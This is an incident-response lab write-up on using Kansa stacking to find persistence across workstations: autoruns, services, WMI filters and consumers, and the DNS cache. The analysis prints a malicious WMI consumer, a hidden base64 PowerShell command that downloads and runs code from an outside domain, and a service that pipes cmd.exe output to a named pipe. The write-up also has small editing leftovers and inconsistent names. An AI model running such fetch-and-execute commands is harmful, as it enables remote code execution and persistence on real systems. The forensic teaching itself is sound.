
# find persistence with kansa

In the last writeup , we manually try to identify persistence mechanism for each machine individually, While this approach was informative, analyzing each system in isolation can be time-consuming and may lead to overlooking patterns. 

Now, we will leverage **Kansa** to streamline our analysis through **stacking** and **frequency analysis**. By using Kansa, we can identify unusual autoruns across multiple systems more effectively, allowing us to detect patterns that could have been missed in a manual review.

## **Objectives**
1. Utilize **Kansa** IR collection data to enhance analysis capabilities.
2. Leverage Kansa's **stacking analysis scripts** to identify outliers.
3. Analyze data at scale, focusing on:
   - **Autoruns Data**
   - **Windows Services**
   - **WMI Event Consumers**
   - **Local DNS Cache Data**

---

## **Background**

Stark Research Labs' IT security analyst, Clint Barton, executed Kansa in the environment after discovering signs of intrusion in the network. Our goal is to review this collected data and locate anomalies, with a particular focus on:

- **R&D Network Workstations** (`base-rd-XX`)
- **Line of Business Network Workstations** (`base-wkstn-XX`)

These workstations have consistent builds, making them ideal for effective **stacking** (outlier) analysis.

---

## **Using Kansa for Automated Analysis**

When using Kansa to collect data, the `-Analysis` option can be specified to automatically generate analysis files following the collection from remote hosts. If this option is not used, the analysis scripts can still be run manually within the directory containing the collected data.

For this investigation, we already have a directory containing the output from Kansa, and we'll organize it for our analysis.

 ![Filter for Verified Signatures](/images/1.4/1.png)

We'll create a folder named **Autoruns-workstations** within the path:

```
G:\Kansa\kansa-post-intrusion\Analysis\
```

### **1. Setting Up the Analysis Environment**

1. **Create the Directory**: `Autoruns-workstations` at the above path.
2. **Copy CSV Files**: Place all the workstation **Autoruns CSV files** into the `Autoruns-workstations` directory.
3. **Add Analysis Script**: Include the appropriate Kansa analysis script for stacking autoruns data:

   > ![Script Location](/images/1.4/2.png)

> Note: There are multiple Kansa scripts for stacking autoruns data, each analyzing it in a different manner. Choose the script that best suits the analysis goal.

![Kansa Analysis Scripts](/images/1.4/3.png)

### **2. Reviewing the Analysis Script**

We'll use `Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1` for this task, located in:

```
G:\Kansa\kansa-post-intrusion\Analysis\Autoruns-workstations\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1
```

1. Right-click on the script and choose **"Edit with Notepad++"** to review its contents.

![Kansa Analysis Scripts](/images/1.4/4.png)

- **Purpose**: The script pulls the **frequency of autoruns** based on:
  - `ImagePath`
  - `LaunchString`
  - `MD5 tuple`

  It specifically looks for entries where the publisher is **not verified** (unsigned code) and the `ImagePath` is not `'File not found'`.

- **Method**: It uses **LogParser** to run SQL statements that filter out signed executables and stack the remaining items based on the **frequency of occurrence**.
  
  ```powershell
  Get-Command logparser.exe -sql "SELECT COUNT(*), ImagePath, LaunchString, MD5 FROM *.autorunsc.csv WHERE Publisher IS NULL AND ImagePath != 'File not found' GROUP BY ImagePath, LaunchString, MD5"
  ```

Most **Kansa analysis scripts** are similarly designed, allowing for easy customization based on investigation needs.

### **3. Running the Analysis Script**

Next, we need to run the script against all the workstations' autoruns data. Here's how:

1. Open a **PowerShell** window at the `Autoruns-workstations` directory by typing `powershell.exe` into the address bar and pressing Enter.
2. Run the following command to generate the **stacked output** and redirect it to a CSV file named `asep-workstation-stack.csv`:

    ```powershell
    .\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 > asep-workstation-stack.csv
    ```

### **4. Reviewing the Output**

The resulting CSV file will be located at:

```
G:\Kansa\kansa-post-intrusion\Analysis\Autoruns-workstations\asep-workstation-stack.csv
```

Open this file using **Timeline Explorer** to view and analyze the results.

---

Here’s a rewritten version of your section on visual analysis with Timeline Explorer:

---

### **Visual Analysis with Timeline Explorer**

1. Begin by opening the `asep-workstation-stack.csv` file in **Timeline Explorer**.
2. Examine the frequency and distribution of autorun entries to pinpoint any potential outliers or anomalies.

> ![Opening CSV with Timeline Explorer](/images/1.4/5.png)

Upon inspection, we notice there are only 27 lines of autoruns across all workstations, which facilitates a swift identification of any abnormal entries. The results are also organized by the count of occurrences, aiding in the analysis.

Let’s start our investigation:

1. For entries that occur only once, we find four distinct values. These items, given their singular presence on just one system, have a high likelihood of being malicious.

> ![Opening CSV with Timeline Explorer](/images/1.4/6.png)

The first entry is `auto_update.bat`. While it should be a legitimate file for Sysmon updates, further investigation is warranted:

   1. We need to identify which workstation hosts this file.
   > ![Opening CSV with Timeline Explorer](/images/1.4/7.png)

   2. We will examine the disk image of `base-wksn-05` using FTK, navigating to the `C:\ProgramData\Sysmon\` directory to locate `auto_update.bat`.
   > ![Opening CSV with Timeline Explorer](/images/1.4/8.png)

   3. After review, we confirm that it is a legitimate script.

For the next three entries—`systemsettings.dll`, `perfsvc.exe`, and `perfmonsvc64.exe`—previous investigations indicated that these are malicious. Even if we had not identified them as malicious before, their unusual names strongly suggest malicious intent and we have md5 hashes for them if you go to virus total with these hashes it's malicious . To find out which systems harbor these values, we will utilize PowerShell.

> ![Opening CSV with Timeline Explorer](/images/1.4/9.png)

2. For entries that occur four times, we encounter three values:

> ![Opening CSV with Timeline Explorer](/images/1.4/10.png)

Upon investigation, we find:

1. **Nagios NCPA:**
   - The files **`ncpa_listener.exe`** and **`ncpa_passive.exe`** are components of Nagios, a widely recognized open-source monitoring system.
   - **NCPA** (Nagios Cross-Platform Agent) is a legitimate tool that allows Nagios to monitor various systems effectively.
   - If these files are present as part of a Nagios installation, they can be considered legitimate.

2. **BGInfo:**
   - The file **`bginfo.bat`** is commonly associated with BGInfo, a utility used to display system information on the desktop background.
   - This tool is also legitimate and frequently used in enterprise environments to provide visibility into system details.

Thus, these values are indeed legitimate.

3. The remaining items appear legitimate and are found across most of the systems we analyzed.

Here’s a revised version of your section on using Kansa to stack services:

---

### **Using Kansa to Stack Services**

Based on the process names identified in our previous findings, several entries suggest they could be associated with services. To analyze these, Kansa offers multiple analysis scripts specifically designed for stacking services. One versatile script within the Kansa framework is **Get-LogparserStack.ps1**. The author describes it as follows (via [FOR508](https://for508.com/logparserstack)):

*"Get-LogparserStack.ps1 can be used to perform frequency analysis against any delimited file or set of files, provided that all files share the same schema and header row. Unlike other Kansa utilities, Get-LogparserStack.ps1 is interactive. After reading the first two lines of each input file and confirming that they have identical header rows, the script prompts the user to select the field for Logparser's COUNT() function, followed by the fields for GROUP BY."*

We have organized the Kansa services files for the workstations into a dedicated directory. To run the interactive **Get-LogparserStack.ps1** script, follow these steps in your PowerShell window:

1. Change to the **SvcAll-workstations** directory:

   ```powershell
   cd G:\kansa\kansa-post-intrusion\Analysis\SvcAll-workstations
   ```
   > ![Opening CSV with Timeline Explorer](/images/1.4/11.png)
2. Execute the script with the following command:

   ```powershell
   .\Get-LogparserStack.ps1 -FilePattern *SvcAll.csv -Delimiter "," -Direction asc -OutFile SvcAll-workstation-stack.csv
   ```

This command instructs the script to identify all matching CSV files that end with **SvcAll.csv** and ensures that they all contain the same header values. You should not encounter errors, just yellow "VERBOSE" messages that indicate the files being analyzed. 

The script will display the names of the headers found in the CSV files and then prompt you for the following:

- Enter the field to pass to COUNT(): **Name**
- Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **Name**
- Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **DisplayName**
- Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **PathName**
- Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **quit**

> ![Opening CSV with Timeline Explorer](/images/1.4/12.png)

Here’s a revised version of your analysis section:

---

After completing these prompts, the script will output the results to the specified file, **SvcAll-workstation-stack.csv**.

### **Analysis of Service Entries**

1. **Noise Reduction**: I began by filtering out common noise, specifically the **svchost.exe** processes. I searched for all entries containing **svchost.exe** and found that all associated values were normal and legitimate.

2. **Filtered Entries**: As a result of this search, I excluded the **svchost.exe** entries, leaving us with the following values:

   > ![Opening CSV with Timeline Explorer](/images/1.4/13.png)

3. **One-Time Occurrences**: Next, I focused on entries with a one-time occurrence:

   > ![Opening CSV with Timeline Explorer](/images/1.4/14.png)

   - **Service: "tbbd05"**: This service is launching **C:\Windows\system32\cmd.exe** and sending the value **"b6a1458f396"** to the named pipe **\\.\pipe\334485**. Named pipes are a method of inter-process communication (IPC) that allows data transfer between processes. In this case, the data being sent is the string **b6a1458f396**. The system associated with this service is **base-wkstn-05**.

     > ![Opening CSV with Timeline Explorer](/images/1.4/15.png)

   - **Services: "perfsvc" and "perfmonsvc64"**: Both of these services appear to be malicious.
   
   - **Service: "osppsvc"**: The Office Software Protection Platform Service (OSPP) is used by Microsoft Office to enforce licensing and activation policies, and it is functioning from the expected path.

   - **Service: "sysmon64"**: This is part of the Sysinternals Suite, utilized for logging system activity related to security monitoring and analysis. It is also operating from the appropriate path.

4. **Reviewing Other Entries**: Upon reviewing the remaining entries, they all appeared to be normal and legitimate.

--- 

### **Stacking WMI Filters and Consumers**

In the previous Autoruns lab, we identified a suspicious WMI persistence method on **base-rd-01**. However, our stacking analysis of Autoruns data did not reveal this malicious WMI event because the consumer executes PowerShell, which we filtered out during our analysis to exclude all digitally signed entries (including PowerShell). Fortunately, Kansa provides scripts to collect WMI data independently of the ASEP collection performed with **Autorunsc.exe**. Kansa can gather WMI Event Filter, WMI Event Consumer, and WMI Binding data, making it an effective tool for detecting malicious WMI event consumers at scale. 

In this section, we will analyze some of the collected data from the SRL network.

1. **Change Directory**: In your PowerShell window, navigate to the directory containing the WMI Event Filter data for workstations:

   ```powershell
   cd G:\kansa\kansa-post-intrusion\Analysis\WMIEvtFilter-workstations
   ```

2. **Run the Analysis Script**: Execute the interactive **Get-LogparserStack.ps1** script as follows:

   ```powershell
   .\Get-LogparserStack.ps1 -FilePattern *WMIEvtFilter.csv -Delimiter "," -Direction asc -OutFile WMIEvtFilter-workstation-stack.csv
   ```

   This command will identify all matching CSV files ending in **WMIEvtFilter.csv** and verify that they all share the same header values. There should be no errors, only yellow "VERBOSE" messages displaying the list of files to be analyzed. The script will then list the names of the headers in the CSV files.

3. **Answering Prompts**: The script will prompt you for the following:

   - Enter the field to pass to COUNT(): **Name**
   - Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **Name**
   - Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **Query**
   - Enter the fields you want to GROUP BY, one per line. Enter "quit" when finished: **quit**

   > ![Opening CSV with Timeline Explorer](/images/1.4/16.png)

The output will be saved in the specified file, **WMIEvtFilter-workstation-stack.csv**.

--- 

### **Analyzing WMI Filters and Consumers**

Let's dive into the analysis of the identified WMI filters.

> ![Opening CSV with Timeline Explorer](/images/1.4/.png)

1. **PerformanceMonitor Filter**  
   - This filter is present on **three machines**: `base-rd-01`, `base-rd-02`, and `base-wrksn-05`. It triggers whenever there are changes to the operating system's performance data and when the system uptime is between 200 and 320 seconds within a 60-second interval. To identify which machines contain this filter, we used a PowerShell script to extract this information.

   > ![Opening CSV with Timeline Explorer](/images/1.4/18.png)
2. **BVTFilter**  
   - The `BVTFilter` is found on **four machines**: `base-rd-05`, `base-rd-06`, `base-wkstn-05`, and `base-wkstn-06`. This filter is activated whenever there are modifications in the `Win32_Processor` instance, and the CPU load exceeds 99% within a 60-second interval. As with the previous filter, we used a PowerShell script to identify the specific machines with this event.

   > ![Opening CSV with Timeline Explorer](/images/1.4/19.png)

3. **Identifying the Associated Event Consumers**  
   - The last identified filter is legitimate and requires no further investigation. However, to better understand what commands are executed by the suspicious filters, we need to examine the **event consumers** associated with each of these WMI filters.

   To do this, we reviewed the **WMI Event Bindings** that link filters to their consumers:

   > ![Opening CSV with Timeline Explorer](/images/1.4/20.png)

   - The binding shows that `PerformanceMonitor` is linked to an event consumer named `SystemPerformanceMonitor`.
   - Similarly, `BVTFilter` is linked to a consumer named `BVTConsumer`.

   By searching for these consumer names in the WMI event consumers data, we can find the specific commands executed by each.

4. **Analyzing Event Consumers**

   1. **SystemPerformanceMonitor**  
      - The command executed by this consumer is:

        ```powershell
        powershell -W Hidden -nop -noni -ec "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA"
        ```

      - This obfuscated Base64 PowerShell command translates to a script that downloads a suspicious file from an external server, confirming its malicious nature.

      > ![Opening CSV with Timeline Explorer](/images/1.4/22.png)

   2. **BVTVFilter**  
      - The command executed by this consumer is:

        ```powershell
        cscript KernCap.vbs
        ```

      - This command runs a script called `KernCap.vbs`, which is usually found in `C:\tools\kernrate`. However, upon investigating, the folder and file `kernrate` were **missing from the specified path**, indicating possible tampering or removal.

      > ![Opening CSV with Timeline Explorer](/images/1.4/23.png)

This analysis confirms that both WMI filters are linked to malicious event consumers designed to execute potentially harmful commands on the target systems. Further investigation of these systems is warranted to assess the full impact of this activity.

--- 
### Stacking DNS Cache Data

To identify suspicious domain names across systems, we can perform a frequency analysis of the DNS cache data. In this scenario, we'll analyze the DNS cache data using **Timeline Explorer**.

1. **Open the DNS Cache Data**:
   
   In **Timeline Explorer**, navigate to the `DNSCacheStack.csv` file, which is located in:
   
   ```plaintext
   G:\kansa\kansa-post-intrusion\Analysis\AnalysisReports
   ```
   
   This file contains a frequency analysis stack for all the domain names found in the DNS cache across **all hosts** queried by **Kansa** (not limited to workstations).

   - **Example View:**
     ![Opening CSV with Timeline Explorer](/images/1.4/24.png)

2. **Reviewing the Domain Frequency**:

   After opening the file in **Timeline Explorer**, review the list of domain names. All of the entries appear to be legitimate, except for a suspicious domain:  
   
   **`squirreldirectory.com`**  
   
   This domain was previously flagged as being associated with a known malicious file. Identifying which machines resolved this domain will help us determine if there was any unwanted communication or compromise.

   - **Example View:**
     ![Opening CSV with Timeline Explorer](/images/1.4/25.png)

3. **Identifying the Affected Machine**:

   To find the machine that looked up this suspicious domain, we can use a simple search command or filter. Using the `HostName` column in **Timeline Explorer**:

   ```plaintext
   Filter: squirreldirectory.com
   ```

   - **Example View:**
     ![Opening CSV with Timeline Explorer](/images/1.4/26.png)

   After applying the filter, it was determined that the machine named:

   **`base-wkstn-03`**

   is the host that performed the DNS lookup for `squirreldirectory.com`. Further investigation should focus on this machine to understand the context of this activity and whether it poses a risk.

## **Summary of Findings**

The investigation using Kansa's frequency analysis and stacking techniques provided critical insights into the autoruns and services data across the Stark Research Labs (SRL) network. By leveraging Kansa’s automated scripts, we were able to identify rare autoruns and anomalous service entries that were missed during the manual analysis in the first part of this chapter. The key findings include:

1. **Malicious Autoruns Identified**:
   - Entries such as **perfsvc.exe**, **perfmonsvc64.exe**, and **systemsettings.dll** were confirmed to be malicious based on VirusTotal analysis and previous research.
   - These autoruns, found on specific systems, were designed to execute malicious binaries, potentially facilitating persistence or remote command execution.

2. **Unusual One-Time Service Entries**:
   - Services like **tbbd05** were configured to launch cmd.exe and interact with named pipes, suggesting suspicious activity.
   - While other legitimate entries such as **osppsvc** and **sysmon64** were present, they appeared to be operating from expected paths and did not exhibit any malicious behavior.

3. **Suspicious WMI Filters and Consumers**:
   - Several WMI event filters, such as **PerformanceMonitor** and **BVTFilter**, were identified on multiple systems. These filters were associated with event consumers executing obfuscated PowerShell commands, indicating a stealthy persistence mechanism.
   - The commands were decoded to reveal scripts that downloaded files from external sources, confirming these entries as malicious.


## **Conclusion**

The utilization of Kansa significantly enhanced our ability to detect anomalous entries at scale across the SRL network. The stacking and frequency analysis techniques provided a higher-level view of the environment, enabling us to detect malicious patterns that could have been easily overlooked in a manual review.

The findings revealed multiple persistence mechanisms, including malicious services and WMI event consumers, that require immediate remediation. Moving forward, adopting centralized logging and continuous monitoring will be essential in improving the detection and response capabilities of the SRL network.

Overall, this chapter highlighted the importance of combining manual review with automated analysis to achieve comprehensive coverage in forensic investigations.

This is the excel sheet updated with new findings [IRSpreadsheet.xlsx](/images/1.4/IRSpreadsheet.xlsx)
